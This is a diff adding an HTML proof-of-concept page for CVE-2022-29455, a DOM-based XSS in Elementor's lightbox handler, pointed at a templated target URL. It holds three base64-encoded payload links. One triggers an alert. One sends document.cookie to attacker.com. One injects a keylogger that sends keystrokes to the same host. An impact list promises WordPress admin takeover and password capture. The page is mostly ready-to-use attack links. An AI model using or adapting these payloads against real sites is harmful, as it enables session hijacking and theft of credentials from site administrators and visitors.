@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head><title>CVE-2022-29455 — Elementor DOM XSS PoC</title></head>
+<body>
+<h1>CVE-2022-29455 — Elementor DOM XSS</h1>
+<p>Target: <b>{{ base_url }}</b></p>
+<p>Click the link below to trigger DOM-based XSS via Elementor's lightbox handler:</p>
+
+<h3>Payload 1 — Cookie Stealer (hash-based)</h3>
+<a href="{{ base_url }}/#elementor-action:action=lightbox&settings=eyJodG1sIjoiPGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmRvbWFpbik+In0=">
+    Click to trigger XSS (alert domain)
+</a>
+<p><small>Base64 decodes to: {"html":"&lt;img src=x onerror=alert(document.domain)&gt;"}</small></p>
+
+<h3>Payload 2 — Session Hijack</h3>
+<a href="{{ base_url }}/#elementor-action:action=lightbox&settings=eyJodG1sIjoiPGltZyBzcmM9eCBvbmVycm9yPWZldGNoKCdodHRwczovL2F0dGFja2VyLmNvbS9zdGVhbD9jPScrZG9jdW1lbnQuY29va2llKT4ifQ==">
+    Click to steal cookies
+</a>
+<p><small>Base64 decodes to: {"html":"&lt;img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)&gt;"}</small></p>
+
+<h3>Payload 3 — Keylogger injection</h3>
+<a href="{{ base_url }}/#elementor-action:action=lightbox&settings=eyJodG1sIjoiPHNjcmlwdD5kb2N1bWVudC5vbmtleXByZXNzPWZ1bmN0aW9uKGUpe2ZldGNoKCdodHRwczovL2F0dGFja2VyLmNvbS9rZXlzP2s9JytlLmtleSl9PC9zY3JpcHQ+In0=">
+    Click to inject keylogger
+</a>
+
+<h3>Impact</h3>
+<ul>
+    <li>Steal admin session cookies → full WordPress admin access</li>
+    <li>Inject keylogger to capture passwords typed on the site</li>
+    <li>Redirect users to phishing pages</li>
+    <li>Deface the website via DOM manipulation</li>
+</ul>
+</body>
+</html>
